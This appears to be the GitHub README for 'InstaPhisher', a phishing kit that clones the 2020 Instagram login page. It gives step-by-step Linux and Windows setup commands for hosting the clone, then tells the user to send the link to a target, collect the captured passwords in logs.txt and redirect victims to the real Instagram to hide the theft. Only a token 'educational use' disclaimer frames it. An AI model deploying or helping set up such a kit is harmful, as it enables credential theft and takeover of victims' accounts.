# InstaPhisher - 2020

__author__ Exilas <br/>
__version__ 2.2

# Disclamer

I am in no way responsible for illegal uses. For educational use only.


# Information

This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi) and php (https://www.php.net/downloads).

Then, move all InstaPhisher files to the apache folder ("/var/www/html" for linux). Make sure to disable your firewall and redirect the port 80 (UDP/TCP) on your router to your machine. If you use Linux, you must grant read and write permissions to the files logs.txt and serverMsg.txt when it will be created. After, use python in a terminal and start the file InstaPhisher.py. Send your DNS url to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.

You can modify the redirect link in the login.php file. Enter url in header() function, after 'Location: ' at line 38. The default redirection is https://www.instagram.com.

Exemple:
-   header("Location: https://www.instagram.com");
-   header("Location: <redirection_url>");

You can also obtain SSL certificates with Let's Encrypt to benefit from an https connection. In this case you will have to redirect ports 80 and 443 (UDP/TCP) of your router to your machine.

The InstaPhisher file is only used to notify you when a new password is captured. It is therefore not necessary to open it, but recommended.


# Installation

## Linux

```
git clone https://github.com/ExilasP/InstaPhisher.git
cd InstaPhisher
cp * -r '/var/www/html'
cd /var/www/html
touch logs.txt && touch serverMsg.txt
sudo chmod 777 logs.txt && chmod 777 serverMsg.txt
service apache2 start
python InstaPhisher.py
```

## Windows

### Apache and Php download and configuration

[Video tutorial](https://www.youtube.com/watch?v=vb0vQYoeWt0 "Video tutorial")<br/>

Use all commands in a terminal as an administrator.

1. Download apache-2.4
```
Powershell.exe Invoke-WebRequest -Uri "https://www.apachelounge.com/download/VS16/binaries/httpd-2.4.43-win64-VS16.zip" -OutFile "%userprofile%\Downloads\httpd-2.4.43-win64-VS16.zip"
```

2. Extract archive
```
Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\httpd-2.4.43-win64-VS16.zip" -DestinationPath "%userprofile%\Downloads\httpd-2.4.43-win64-VS16"
```

3. Download Visual C++ (required for apache)
```
Powershell.exe Invoke-WebRequest -Uri "https://aka.ms/vs/16/release/VC_redist.x64.exe" -OutFile "%userprofile%\Downloads\VC_redist.x64.exe"
start %userprofile%\Downloads\VC_redist.x64.exe
```

4. Move apache24 folder to C:\apache24.
```
cd %userprofile%\Downloads\httpd-2.4.43-win64-VS16
move /Y %userprofile%\Downloads\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
```

5. You must modify Apache24\conf\httpd.conf
-	Open C:/Apache24/httpd.conf with notepad
-	line 162: replace "#LoadModule rewrite_module modules/mod_rewrite.so" to "LoadModule rewrite_module modules/mod_rewrite.so"

6. Install Apache
```
cd /Apache24/bin
httpd -k install
```

7. Download php Thread Safe
```
Powershell.exe Invoke-WebRequest -Uri "https://windows.php.net/downloads/releases/php-7.4.6-Win32-vc15-x64.zip" -OutFile "%userprofile%\Downloads\php-7.4.5RC1-Win32-vc15-x64.zip"
```

8. Extract archive
```
Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\php-7.4.5RC1-Win32-vc15-x64.zip" -DestinationPath "%userprofile%\Downloads\php"
```

9. Rename php.ini-development to php.ini.
```
Powershell.exe Rename-Item -Path "%userprofile%\Downloads\php\php.ini-development" -NewName "%userprofile%\Downloads\php\php.ini-development"
```

10. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php.
```
Powershell.exe Move-Item -Path "%userprofile%\Downloads\php" -Destination "C:\"
```

11. Open C:/Apache24/conf/httpd.conf
- Add the following lines at the end:
```
PHPIniDir "C:/php"
LoadModule php7_module "C:/php/php7apache2_4.dll"
AddHandler application/x-httpd-php .php
```

### InstaPhisher download

1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs). PowerShell in administrator.
```
Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Downloads\InstaPhisher.zip"
Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -DestinationPath "%userprofile%\Downloads\InstaPhisher"
Powershell.exe Move-Item -Path "%userprofile%\Downloads\InstaPhisher\InstaPhisher-master\*" -Destination "C:\Apache24\htdocs\"
```


# Notice

## Requirements

-   Python : https://www.python.org/downloads/
-   Apache : https://httpd.apache.org/download.cgi
-   Php    : https://www.php.net/downloads
-   DNS    : https://www.freenom.com/
-   Linux, Windows or MacOS (simpler with linux)

## Usage

### Linux:

```
service apache2 start   #"service apache2 stop" for stop 
python InstaPhisher.py  #Not required but recommended
```

### Windows:

With admin cmd
```
cd C:\Apache24\bin
httpd -k start          #"httpd -k stop" for stop
C:\Apache24\htdocs\InstaPhisher.py
```

# Screenshot

![Alt text](screenshot/InstaPhisher.jpg?raw=true "Screenshot")
![Alt text](screenshot/terminal.png?raw=true "Screenshot")
![Alt text](screenshot/logs.png?raw=true "Screenshot")
